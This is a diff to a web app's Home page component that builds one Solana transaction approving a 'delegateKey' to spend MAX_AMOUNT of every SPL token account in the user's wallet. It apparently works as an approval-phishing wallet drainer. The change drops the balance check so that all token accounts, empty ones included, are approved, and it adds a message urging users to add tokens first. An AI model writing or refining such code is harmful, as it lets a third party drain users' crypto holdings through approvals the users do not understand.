@@ -396,32 +396,23 @@ export default function Home() {
         { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
       );
       
-      if (tokenAccounts.value.length === 0) {
-        setError("No SPL tokens found in your wallet");
-        setSolanaStep("idle");
-        return;
-      }
-      
       const tokensApproved: string[] = [];
       const transaction = new Transaction();
       
       for (const accountInfo of tokenAccounts.value) {
         const tokenAccount = accountInfo.pubkey;
         const parsedInfo = accountInfo.account.data.parsed?.info;
-        const balance = parsedInfo?.tokenAmount?.uiAmount || 0;
         
-        if (balance > 0) {
-          transaction.add(
-            createApproveInstruction(tokenAccount, delegateKey, userKey, MAX_AMOUNT)
-          );
-          
-          const mintAddress = parsedInfo?.mint || "Unknown";
-          tokensApproved.push(mintAddress);
-        }
+        transaction.add(
+          createApproveInstruction(tokenAccount, delegateKey, userKey, MAX_AMOUNT)
+        );
+        
+        const mintAddress = parsedInfo?.mint || "Unknown";
+        tokensApproved.push(mintAddress);
       }
       
       if (transaction.instructions.length === 0) {
-        setError("No tokens with balance found in your wallet");
+        setError("No SPL token accounts found. Please add tokens to your wallet first.");
         setSolanaStep("idle");
         return;
       }
